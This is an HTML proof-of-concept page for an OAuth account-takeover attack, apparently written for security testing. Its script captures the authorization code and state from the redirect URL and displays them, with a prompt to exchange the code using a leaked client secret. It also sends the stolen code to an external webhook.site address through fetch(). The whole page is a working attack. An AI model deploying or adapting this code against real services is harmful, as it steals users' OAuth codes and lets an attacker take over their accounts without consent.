<!DOCTYPE html>
<html>
<head><title>ATO PoC</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
    <h1>✅ OAuth Code Intercepted!</h1>
    <pre id="output"></pre>

    <script>
        const params = new URLSearchParams(window.location.search);
        const code = params.get('code');
        const state = params.get('state');

        if (code) {
            document.getElementById('output').innerHTML = 
                `Auth Code: ${code}\n\n` +
                `State: ${state}\n\n` +
                `→ Now exchange with leaked client_secret at /token endpoint`;
            // Optional: auto-exfil to your server
            fetch('https://webhook.site/fcae97a7-2bde-426e-96e8-c2ed6537c466/code=' + encodeURIComponent(code));
        } else {
            document.getElementById('output').innerText = "No code yet... (waiting for redirect)";
        }
    </script>
</body>
</html>
